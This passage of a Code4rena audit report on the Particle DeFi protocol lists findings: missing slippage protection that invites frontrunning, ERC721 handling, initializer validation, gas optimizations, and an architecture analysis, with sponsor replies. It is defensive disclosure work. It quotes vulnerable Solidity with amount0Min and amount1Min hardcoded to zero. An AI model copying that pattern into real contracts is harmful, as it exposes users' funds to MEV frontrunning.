## [[M-15] AddLiquidity and decreaseLiquidity missing slippage protection](https://github.com/code-423n4/2023-12-particle-findings/issues/2)
*Submitted by [ladboy233](https://github.com/code-423n4/2023-12-particle-findings/issues/2), also found by [adriro](https://github.com/code-423n4/2023-12-particle-findings/issues/57), [immeas](https://github.com/code-423n4/2023-12-particle-findings/issues/41), [bin2chen](https://github.com/code-423n4/2023-12-particle-findings/issues/29), and [said](https://github.com/code-423n4/2023-12-particle-findings/issues/13)*

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/libraries/LiquidityPosition.sol#L195> 

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/libraries/LiquidityPosition.sol#L258>

When user mint NFT add liquidity, user can specify two parameter, params.amount0Min and params.amount1Min

            // mint the position
            (tokenId, liquidity, amount0Minted, amount1Minted) = Base.UNI_POSITION_MANAGER.mint(
                INonfungiblePositionManager.MintParams({
                    token0: params.token0,
                    token1: params.token1,
                    fee: params.fee,
                    tickLower: params.tickLower,
                    tickUpper: params.tickUpper,
                    amount0Desired: params.amount0ToMint,
                    amount1Desired: params.amount1ToMint,
                    amount0Min: params.amount0Min,
                    amount1Min: params.amount1Min,
                    recipient: address(this),
                    deadline: block.timestamp
                })
            );

If the minted amount is too small, transaction revert [in this check](https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/base/LiquidityManagement.sol#L88) in Uniswap position manager when addling liquidity.

```solidity
(amount0, amount1) = pool.mint(
	params.recipient,
	params.tickLower,
	params.tickUpper,
	liquidity,
	abi.encode(MintCallbackData({poolKey: poolKey, payer: msg.sender}))
);

require(amount0 >= params.amount0Min && amount1 >= params.amount1Min, 'Price slippage check');
```

However, when addling liquidity, the parameter [amount0Min and amount1Min is set to 0](https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/libraries/LiquidityPosition.sol#L195).

```solidity
// increase liquidity via position manager
(liquidity, amount0Added, amount1Added) = Base.UNI_POSITION_MANAGER.increaseLiquidity(
	INonfungiblePositionManager.IncreaseLiquidityParams({
		tokenId: tokenId,
		amount0Desired: amount0,
		amount1Desired: amount1,
		amount0Min: 0,
		amount1Min: 0,
		deadline: block.timestamp
	})
);
```

As Uniswap V3 docs highlight:

<https://docs.uniswap.org/contracts/v3/guides/providing-liquidity/mint-a-position#calling-mint>

> We set amount0Min and amount1Min to zero for the example - but this would be a vulnerability in production. A function calling mint with no slippage protection would be vulnerable to a frontrunning attack designed to execute the mint call at an inaccurate price.

If the user transaction suffers from frontrunning, a much less amount of token can be minted.

Same issue happens when user decrease liquidity:

```solidity
    function decreaseLiquidity(uint256 tokenId, uint128 liquidity) internal returns (uint256 amount0, uint256 amount1) {
        (amount0, amount1) = Base.UNI_POSITION_MANAGER.decreaseLiquidity(
            INonfungiblePositionManager.DecreaseLiquidityParams({
                tokenId: tokenId,
                liquidity: liquidity,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );
    }
```

The amount0 and amount1Min are set to 0.

When MEV bot frontruns the decrease liquidity, much less amount0 and amount1 are released.

### Recommended Mitigation Steps

Recommend do not hardcode slippage protection parameter amount0Min and amount1Min to 0 when increase liquidity or decrease liquidity.

**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/2#issuecomment-1866962114):**
 > This seems valid and serious. Worth adding as user-controlled parameters.

**[wukong-particle (Particle) confirmed and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/2#issuecomment-1868137592):**
 > Agreed. Will add slippage protection when increase/decrease liquidity. 

***

# Low Risk and Non-Critical Issues

For this audit, 5 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-12-particle-findings/issues/49) by **immeas** received the top score from the judge.

*The following wardens also submitted reports: [adriro](https://github.com/code-423n4/2023-12-particle-findings/issues/62), [bin2chen](https://github.com/code-423n4/2023-12-particle-findings/issues/37), [ladboy233](https://github.com/code-423n4/2023-12-particle-findings/issues/19), and [said](https://github.com/code-423n4/2023-12-particle-findings/issues/12).*

## Summary

| id | title |
| --- | --- |
| [L-01](#l-01-particlepositionmanageronerc721received-allows-all-erc721-tokens) | `ParticlePositionManager::onERC721Received` allows all ERC721 tokens |
| [L-02](#l-02-particlepositionmanager-can-be-initialized-with-bad-params) | `ParticlePositionManager` can be initialized with bad params |
| [L-03](#l-03-fee-tier-100-is-also-supported-by-uniswap) | Fee tier `100` is also supported by Uniswap |
| [L-04](#l-04-use-of-non-upgradable-reentrancyguard) | Use of non-upgradable `ReentrancyGuard` |
| [L-05](#l-05-some-tokens-revert-on-0-amount-transfer) | Some tokens revert on `0` amount transfer |
| [L-06](#l-06-uniswap-positions-minted-to-particlepositionmanager-are-stuck) | Uniswap positions minted to `ParticlePositionManager` are stuck |
| [N-01](#n-01-liquidation-criteria-very-complicated) | Liquidation criteria very complicated |
| [N-02](#n-02-confusing-parameter-naming-in-particlepositionmanagerswap) | Confusing parameter naming in `ParticlePositionManager::swap` |
| [N-03](#n-03-erroneous-comment) | Erroneous comment |

## [L-01] `ParticlePositionManager::onERC721Received` allows all ERC721 tokens

[``ParticlePositionManager::onERC721Received``](https://github.com/code-423n4/2023-12-particle/blob/main/contracts/protocol/ParticlePositionManager.sol#L98-L111):
```solidity
File: contracts/protocol/ParticlePositionManager.sol

 98:    function onERC721Received(
...
103:    ) external override returns (bytes4) {
104:        if (msg.sender == Base.UNI_POSITION_MANAGER_ADDR) {
			// ... add liq position
109:        }
			// all ERC721s are accepted
110:        return this.onERC721Received.selector;
111:    }
```

As you see above all ERC721 tokens are accepted. This can cause ERC721 tokens accidentally sent to the contract to be stuck as there is no way to transfer them back (apart from code upgrade).

### Recommendation
Consider only allowing `UNI_POSITION_MANAGER` to send ERC721 tokens to the contract and reverting otherwise.

## [L-02] `ParticlePositionManager` can be initialized with bad params

`ParticlePositionManager` has some parameters that are used to control fees, liquidation rewards and loan terms. If these params are incorrect they can cause severe problems with the contract. Therefore, when updating them, [they are verified](https://github.com/code-423n4/2023-12-particle/blob/main/contracts/protocol/ParticlePositionManager.sol#L560-L605) to be within certain limits. This is however not done, when initilizing the contract:

[`ParticlePositionManager::initialize`](https://github.com/code-423n4/2023-12-particle/blob/main/contracts/protocol/ParticlePositionManager.sol#L60-L74):
```solidity
File: contracts/protocol/ParticlePositionManager.sol

60:    function initialize(
61:        address dexAggregator,
62:        uint256 feeFactor,
63:        uint128 liquidationRewardFactor,
64:        uint256 loanTerm,
65:        uint256 treasuryRate
66:    ) external initializer {
67:        __UUPSUpgradeable_init();
68:        __Ownable_init();
69:        DEX_AGGREGATOR = dexAggregator;
70:        FEE_FACTOR = feeFactor;
71:        LIQUIDATION_REWARD_FACTOR = liquidationRewardFactor;
72:        LOAN_TERM = loanTerm;
73:        _treasuryRate = treasuryRate;
74:    }
```

Hence the contract can be setup with any values:

### PoC
```solidity
    function testSetupWithBadParams() public {
        address impl = address(new ParticlePositionManager());

        bytes memory init = abi.encodeWithSelector(ParticlePositionManager.initialize.selector,
          address(0), type(uint256).max, type(uint128).max, type(uint256).max, type(uint256).max);
          
        ParticlePositionManager ppm = ParticlePositionManager(address(new ERC1967Proxy(address(impl),init)));

        assertEq(address(0),ppm.DEX_AGGREGATOR());
        assertEq(type(uint256).max,ppm.FEE_FACTOR());
        assertEq(type(uint128).max,ppm.LIQUIDATION_REWARD_FACTOR());
        assertEq(type(uint256).max,ppm.LOAN_TERM());
        // treasury rate cannot be verified as it isn't public and there's no getter for it
        // assertEq(type(uint256).max,ppm._treasuryRate());
    }
```

### Recommendation
Consider using the setter functions already declared, `update*(...)`, to initialize the contract parameters. That would guarantee that the initialization is done using the same validation as changing the parameters. 

## [L-03] Fee tier `100` is also supported by Uniswap

The helper contract `ParticleInfoReader` has a function to view which uniswap pool has the deepest liquidity:

[`ParticleInfoReader::getDeepPool`](https://github.com/code-423n4/2023-12-particle/blob/main/contracts/protocol/ParticleInfoReader.sol#L102-L117):
```solidity
File: contracts/protocol/ParticleInfoReader.sol

102:    function getDeepPool(address token0, address token1) external view returns (address deepPool) {
103:        uint24[3] memory feeTiers = [uint24(500), uint24(3000), uint24(10000)];
104:        uint128 maxLiquidity = 0;
105:
106:        for (uint256 i = 0; i < feeTiers.length; i++) {
107:            address poolAddress = Base.UNI_FACTORY.getPool(token0, token1, feeTiers[i]);
108:            if (poolAddress != address(0)) {
109:                IUniswapV3Pool pool = IUniswapV3Pool(poolAddress);
110:                uint128 liquidity = pool.liquidity();
111:                if (liquidity > maxLiquidity) {
112:                    maxLiquidity = liquidity;
113:                    deepPool = poolAddress;
114:                }
115:            }
116:        }
117:    }
```

The issue is that uniswap supports more `feeTiers`:

https://docs.uniswap.org/concepts/protocol/fees#pool-fees-tiers:
> More fee levels may be added by UNI governance, e.g. the 0.01% fee level added by this governance proposal in November 2021, as executed here.

If you look at the contract:<br>
https://etherscan.io/address/0x1f98431c8ad98523631ae4a59f267346ea31f984#readContract<br>
it returns tick spacing `1` for fee tier `100`.

Hence this might not return the pool with the deepest liquidity.

### Recommendation
Consider adding `100` to the list of fee tiers.

## [L-04] Use of non-upgradable `ReentrancyGuard`

`ParticlePositionManager` is an upgradeable contract. Therefore it uses both `Ownable2StepUpgradeable` and `UUPSUpgradeable` from OZ. It does not however use `ReentrancyGuardUpgradeable` but instead `ReentrancyGuard`:

[`ParticlePositionManager.sol#L19-L26`](https://github.com/code-423n4/2023-12-particle/blob/main/contracts/protocol/ParticlePositionManager.sol#L19-L26):
```solidity
File: contracts/protocol/ParticlePositionManager.sol

19: contract ParticlePositionManager is
20:    IParticlePositionManager,
21:    Ownable2StepUpgradeable,
22:    UUPSUpgradeable,
23:    IERC721Receiver,
24:    ReentrancyGuard,
25:    Multicall
26: {
```

If `ReentrancyGuard` was upgraded in the future with new state this could cause issues for `ParticlePositionManager`.

### Recommendation
Consider using `ReentrancyGuardUpgradeable` from OZ.

## [L-05] Some tokens revert on `0` amount transfer

[`ParticlePositionManager::liquidatePosition`](https://github.com/code-423n4/2023-12-particle/blob/main/contracts/protocol/ParticlePositionManager.sol#L376-L378):
```solidity
File: protocol/ParticlePositionManager.sol

376:        // reward liquidator
377:        TransferHelper.safeTransfer(closeCache.tokenFrom, msg.sender, liquidateCache.liquidationRewardFrom);
378:        TransferHelper.safeTransfer(closeCache.tokenTo, msg.sender, liquidateCache.liquidationRewardTo);
```

[Some tokens, like `LEND`](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#revert-on-zero-value-transfers) revert on `0` amount transfer. If the liquidation amount is `0` for this token this would make liquidation impossible for this position.

### Recommendation
Consider checking if the `liquidationAmount > 0` before transferring liquidation reward.

## [L-06] Uniswap positions minted to `ParticlePositionManager` are stuck

Using the `NonfungiblePositionManager` directly a user could potentially mint a position directly to `ParticlePositionManager` by having `ParticlePositionManager` as the `receiver` when calling [`NonfungiblePositionManager::mint`](https://github.com/Uniswap/v3-periphery/blob/main/contracts/NonfungiblePositionManager.sol#L156).

Since `NonfungiblePositionManager` doesn't use `safeMint` this would just transfer the token and liquidity to `ParticlePositionManager` without calling `ParticlePositionManager::onERC721Received`, thus the liquidity would be lost.

### Recommendation
Consider adding a rescue function callable by `owner` that can transfer any accidentally minted tokens out of the contract. This could check that `ParticlePositionManager` is the owner of the token but has `lps.owner == address(0)` to prevent misuse.

## [N-01] Liquidation criteria very complicated

[`ParticlePositionManager::liquidatePosition`](https://github.com/code-423n4/2023-12-particle/blob/main/contracts/protocol/ParticlePositionManager.sol#L358-L368):
```solidity
File: contracts/protocol/ParticlePositionManager.sol

358:        // check for liquidation condition
359:        ///@dev the liquidation condition is that
360:        ///     (EITHER premium is not enough) OR (cutOffTime > startTime AND currentTime > startTime + LOAN_TERM)
361:        if (
362:            !((closeCache.tokenFromPremium < liquidateCache.tokenFromOwed ||
363:                closeCache.tokenToPremium < liquidateCache.tokenToOwed) ||
364:                (lien.startTime < lps.getRenewalCutoffTime(lien.tokenId) &&
365:                    lien.startTime + LOAN_TERM < block.timestamp))
366:        ) {
367:            revert Errors.LiquidationNotMet();
368:        }
```

Even with the comment it is very hard to understand this criteria.

I suggest to move it to a function `canBeLiquidated` or similar where the logic can be broken up into multiple blocks and made easier to comprehend.

## [N-02] Confusing parameter naming in `ParticlePositionManager::swap`

It's called `token0`/`1` but later in the swap library its `tokenFrom`/`To`.

The parameters would be easier to understand if they were from/to in `ParticlePositionManager::swap` as well.

## [N-03] Erroneous comment

[`ParticlePositionManager::_closePosition`](https://github.com/code-423n4/2023-12-particle/blob/main/contracts/protocol/ParticlePositionManager.sol#L422):
```solidity
File: contracts/protocol/ParticlePositionManager.sol

422:        // add liquidity back to borrower
```

`borrower` is not correct here, liquidity is added back to the lender/liquidity provider.

**[wukong-particle (sponsor) confirmed](https://github.com/code-423n4/2023-12-particle-findings/issues/49#issuecomment-1871715160)**

***

# Gas Optimizations

The [report highlighted below](https://github.com/code-423n4/2023-12-particle-findings/issues/63) by **adriro** details gas optimizations and received the top score from the judge.

## Summary

Total of **12 findings**:

|ID|Finding|
|:--:|:---|
| [G-01] | UniswapV3 Pool address can be computed locally |
| [G-02] | Unchecked math in `Base.refund()` |
| [G-03] | `feeGrowthInside` is monotonic increasing |
| [G-04] | Optimize packing in `Lien` struct |
| [G-05] | Duplicate storage variable in ParticleInfoReader |
| [G-06] | Lien is fetched twice in the implementation of `getLien()` |
| [G-07] | No need to make `_nextRecordId` shorter than the size of a word |
| [G-08] | Duplicate checks in `_closePosition()` |
| [G-09] | Consider using the "off-chain storage" pattern |
| [G-10] | Cache storage variables in `openPosition()` |
| [G-11] | Lien id can be safely incremented using unchecked math |
| [G-12] | Cache storage variables in `liquidatePosition()` |

## [G-01] UniswapV3 Pool address can be computed locally

UniswapV3 deploys pools deterministically, which means that their addresses can be computed locally by using the token addresses and the fee. 

Instead of externally querying `IUniswapV3Factory.getPool()`, pool addresses can be using the [`PoolAddress.computeAddress()`](https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/libraries/PoolAddress.sol#L33) helper function.

Instances:

- https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/libraries/Base.sol#L182
- https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/libraries/Base.sol#L325
- https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticleInfoReader.sol#L92
- https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticleInfoReader.sol#L131

## [G-02] Unchecked math in `Base.refund()`

```solidity
75:     function refund(address recipient, address token, uint256 amountExpected, uint256 amountActual) internal {
76:         if (amountExpected > amountActual) {
77:             TransferHelper.safeTransfer(token, recipient, amountExpected - amountActual);
78:         }
79:     }
```

Since `amountExpected` is guaranteed to be greater than `amountActual` by the check in line 76, the subtraction `amountExpected - amountActual` can be done using unchecked math.

## [G-03] `feeGrowthInside` is monotonic increasing

The "feeGrowthInside" values that track fees in Uniswap are monotonic increasing (these never decrease with updated values).

The subtractions present in `getOwedFee()` (lines 363 and 368) can be done using unchecked math:

```solidity
354:     function getOwedFee(
355:         uint256 feeGrowthInside0X128,
356:         uint256 feeGrowthInside1X128,
357:         uint256 feeGrowthInside0LastX128,
358:         uint256 feeGrowthInside1LastX128,
359:         uint128 liquidity
360:     ) internal pure returns (uint128 token0Owed, uint128 token1Owed) {
361:         if (feeGrowthInside0X128 > feeGrowthInside0LastX128) {
362:             token0Owed = uint128(
363:                 FullMath.mulDiv(feeGrowthInside0X128 - feeGrowthInside0LastX128, liquidity, FixedPoint128.Q128)
364:             );
365:         }
366:         if (feeGrowthInside1X128 > feeGrowthInside1LastX128) {
367:             token1Owed = uint128(
368:                 FullMath.mulDiv(feeGrowthInside1X128 - feeGrowthInside1LastX128, liquidity, FixedPoint128.Q128)
369:             );
370:         }
371:     }
```

## [G-04] Optimize packing in `Lien` struct

The `zeroForOne` field can be accommodated with the first set of values to make it fit in a single slot.

Taking the first 5 fields, we have `40 + 128 + 24 + 24 + 32 = 248` bits. A `bool` type, which is 8 bits, can be accommodated with these fields to fit everything in 256 bits.

```solidity
08:     struct Info {
09:         uint40 tokenId;
10:         uint128 liquidity;
11:         uint24 token0PremiumPortion;
12:         uint24 token1PremiumPortion;
13:         uint32 startTime;
14:         uint256 feeGrowthInside0LastX128;
15:         uint256 feeGrowthInside1LastX128;
16:         bool zeroForOne;
17:     }
```

## [G-05] Duplicate storage variable in ParticleInfoReader

The reference to the ParticlePositionManager is duplicated in the storage space of ParticleInfoReader.

https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticleInfoReader.sol#L24-L26

```solidity
24:     address public PARTICLE_POSITION_MANAGER_ADDR;
25:     ParticlePositionManager internal _particlePositionManager;
26: 
```

Even though the declared types are different, these are both essentially an address that points to the same place. Consider removing one of these.

## [G-06] Lien is fetched twice in the implementation of `getLien()`

https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticleInfoReader.sol#L302

The implementation of `getLien()` in the ParticleInfoReader contract fetches the lien from the ParticlePositionManager contract, and then calls the `getPremium()` which also fetches the same lien from the external contract.

Consider refactoring both functions so that lien is queried once in the implementation of `getLien()`.

## [G-07] No need to make `_nextRecordId` shorter than the size of a word

In the current implementation of ParticlePositionManager, the data type for the `_nextRecordId` variable (the one that tracks the ids of liens) is `uint96`.

```solidity
37:     /* Variables */
38:     uint96 private _nextRecordId; ///@dev used for both lien and swap
39:     uint256 private _treasuryRate;
40:     // solhint-disable var-name-mixedcase
41:     address public DEX_AGGREGATOR;
42:     uint256 public FEE_FACTOR;
43:     uint128 public LIQUIDATION_REWARD_FACTOR;
44:     uint256 public LOAN_TERM;
```

As this variable isn't packed with any other adjacent storage (`_treasuryRate` will always be placed in the next storage slot since it is 256 bits long) there is no real need to define a shorter type then `uint256`. Using `uint96` will incur in unneeded gas costs as the variable needs to be sanitized while loading or saving it to storage.

## [G-08] Duplicate checks in `_closePosition()`

The implementation of `_closePosition()` checks that the required amounts needed to recover the liquidity do not exceed the available tokens in the position:

https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L413-L420

```solidity
413:         // the liquidity to add must be no less than the available amount
414:         /// @dev the max available amount contains the tokensOwed, will have another check in below at refundWithCheck
415:         if (
416:             cache.amountFromAdd > cache.collateralFrom + cache.tokenFromPremium - cache.amountSpent ||
417:             cache.amountToAdd > cache.amountReceived + cache.tokenToPremium
418:         ) {
419:             revert Errors.InsufficientRepay();
420:         }
```

However, the same checks are also performed later when refunding the borrower using `refundWithCheck()`:

https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L460-L490

```solidity
460:         if (lien.zeroForOne) {
461:             cache.token0Owed = cache.token0Owed < cache.tokenToPremium ? cache.token0Owed : cache.tokenToPremium;
462:             cache.token1Owed = cache.token1Owed < cache.tokenFromPremium ? cache.token1Owed : cache.tokenFromPremium;
463:             Base.refundWithCheck(
464:                 borrower,
465:                 cache.tokenFrom,
466:                 cache.collateralFrom + cache.tokenFromPremium,
467:                 cache.amountSpent + cache.amountFromAdd + cache.token1Owed
468:             );
469:             Base.refundWithCheck(
470:                 borrower,
471:                 cache.tokenTo,
472:                 cache.amountReceived + cache.tokenToPremium,
473:                 cache.amountToAdd + cache.token0Owed
474:             );
475:         } else {
476:             cache.token0Owed = cache.token0Owed < cache.tokenFromPremium ? cache.token0Owed : cache.tokenFromPremium;
477:             cache.token1Owed = cache.token1Owed < cache.tokenToPremium ? cache.token1Owed : cache.tokenToPremium;
478:             Base.refundWithCheck(
479:                 borrower,
480:                 cache.tokenFrom,
481:                 cache.collateralFrom + cache.tokenFromPremium,
482:                 cache.amountSpent + cache.amountFromAdd + cache.token0Owed
483:             );
484:             Base.refundWithCheck(
485:                 borrower,
486:                 cache.tokenTo,
487:                 cache.amountReceived + cache.tokenToPremium,
488:                 cache.amountToAdd + cache.token1Owed
489:             );
490:         }
```

## [G-09] Consider using the "off-chain storage" pattern

The ["off-chain storage" pattern](https://github.com/dragonfly-xyz/useful-solidity-patterns/tree/main/patterns/off-chain-storage) can help reduce gas costs by moving the Lien structure off-chain and only storing the hash of the current state.

This pattern was present in the Particle Leverage Trading protocol.

## [G-10] Cache storage variables in `openPosition()`

https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L192

The implementation of `openPosition()` reads the `FEE_FACTOR` storage variable twice at lines 192 and 193.

## [G-11] Lien id can be safely incremented using unchecked math

The `_nextRecordId` variable works as a counter that is incremented by one every time a new position is created. It would be impossible in practice for this variable to overflow.

## [G-12] Cache storage variables in `liquidatePosition()`

https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L350

The implementation of `liquidatePosition()` reads the `LIQUIDATION_REWARD_FACTOR` storage variable twice at lines 350 and 353.

**[wukong-particle (Particle) confirmed and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/63#issuecomment-1871763101):**
 > What a nice trick to learn for G-01, thanks!
> 
> Re G-04, so we should modify it into the following, right?
> ```
> struct Info {
>          uint40 tokenId;
>          uint128 liquidity;
>          uint24 token0PremiumPortion;
>          uint24 token1PremiumPortion;
>          uint32 startTime;
>          bool zeroForOne;
>          uint256 feeGrowthInside0LastX128;
>          uint256 feeGrowthInside1LastX128;
> }
> ```
> 
> Also, I thought bool is 1 bit (enough to encode), why is it 8 bits?

**[adriro (Warden) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/63#issuecomment-1872541015):**
 > > ```
> > struct Info {
> >          uint40 tokenId;
> >          uint128 liquidity;
> >          uint24 token0PremiumPortion;
> >          uint24 token1PremiumPortion;
> >          uint32 startTime;
> >          bool zeroForOne;
> >          uint256 feeGrowthInside0LastX128;
> >          uint256 feeGrowthInside1LastX128;
> > }
> > ```
> 
> Yes, that's correct. Even if a bool takes a single bit, these are always encoded as 1 byte. 

***

# Audit Analysis

An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-12-particle-findings/issues/24) by **ladboy233** received the top score from the judge.

## Admin configuration dependency

The protocol admin is capable of updating the parameter in Particle Position Manager below:

1. **Updating the Fee Factor**: The protocol admin can adjust the fee factor, which mpacts transaction fees within the protocol. This adjustment can be crucial for maintaining the protocol's economic balance, ensuring that fees are neither too high (discouraging user engagement) nor too low (reducing revenue for the protocol).

2. **Dex Aggregator Address**: The admin can change the address of the decentralized exchange (DEX) aggregator. This is significant as the DEX aggregator is responsible for finding the best trade prices across multiple exchanges. Altering this address can shift where the protocol sources its liquidity and trade execution, potentially impacting efficiency and cost.

3. **LIQUIDATION\_REWARD\_FACTOR**: This parameter is related to the incentives provided to users who participate in the liquidation process of the protocol. Adjusting the LIQUIDATION\_REWARD\_FACTOR can influence the eagerness of users to participate in liquidations, which is vital for the health and stability of the system, especially in a lending/borrowing context.

4. **LOAN\_TERM**: The ability to modify the LOAN\_TERM parameter suggests that the protocol admin can change the duration for which loans are issued. This is a critical factor in a lending protocol, as it affects the risk profile of loans and the planning of borrowers and lenders alike.

5. **\_treasuryRate**: This is a parameter related to how funds are allocated to the protocol's treasury. Adjusting the \_treasuryRate could influence the financial sustainability of the protocol, dictating how much revenue is reinvested or reserved for operational expenses.

## Enhancements for Token Swapping and Position Closure

### Validation in Token Swapping
- **Importance**: Ensuring robust validation during token swapping is crucial, particularly when users are closing positions. This involves verifying token authenticity, ensuring compliance with protocol rules, and safeguarding against potential errors or exploits and validating the swap token amount does not use other user's fund
- **Recommendation**: Implement comprehensive checks for token contracts, swap parameters, and slippage tolerances. Additionally, monitoring for unusual activity or large transactions can help in preempting potential issues.

### Addressing Liquidity and Price Manipulation Concerns
- **Underlying Liquidity in Uniswap V3**: 
  - **Issue**: Sufficient liquidity in the Uniswap V3 pools is vital for smooth operation, especially for large transactions that could significantly impact prices.
  - **Recommendation**: Regular monitoring of liquidity levels and potentially diversifying liquidity sources could mitigate risks associated with insufficient liquidity.
- **Oracle Price Reliability**: 
  - **Challenge**: The reliance on an oracle for pricing poses a risk of price manipulation.
  - **Solution**: Using a combination of multiple reliable oracle services and implementing checks against sudden price shifts can enhance resistance to manipulation.

### User-Friendly Approach to Surplus Funds
- **Claiming Surplus Funds**: 
  - **Current Approach**: Refunding tokens directly to users.
  - **Proposed Change**: Allow users to claim surplus funds themselves. This approach can offer better user control and may reduce operational load on the protocol.
- **Implementation**: Adjust smart contracts to enable a claim mechanism for surplus funds and ensure that this process is intuitive and secure for users.

## Refinement of Liquidation Logic
- **Issue with Current \_closePosition Logic**: The same logic in \_closePosition is applied for both standard position closures and liquidations, which may not be optimal.
- **Proposed Improvement**: 
  - **For Liquidations**: The \_closePosition function should be tailored specifically for liquidation scenarios. This could involve different parameters or processes to handle the distinct nature of liquidations, like rapid execution and different fee structures.
  - **General Principle**: The goal is to ensure fairness and efficiency in liquidations, protecting both borrowers and the protocol's health.

## Conclusion
The above suggestions aim to enhance the protocol's stability, user experience, and resilience against market manipulations. By focusing on stringent validation processes, addressing liquidity and price concerns, making user interactions more intuitive, and refining the liquidation logic, the protocol can achieve a more robust and user-friendly ecosystem. These improvements are not just technical adjustments but are crucial steps towards building trust and reliability in the protocol.

### Time spent:
20 hours

**[wukong-particle (Particle) acknowledged and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/24#issuecomment-1871705010):**
 > We're gonna acknowledge the QA report here. But "Oracle Price Reliability" is moot since this protocol doesn't rely on a price oracle to operate.
> 
> Re "The same logic in \_closePosition is applied for both standard position closures and liquidations, which may not be optimal." -- can this be elaborated? We thought reusing this part of the code is optimal for contract development and maintenance, since the same logic is shared.

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
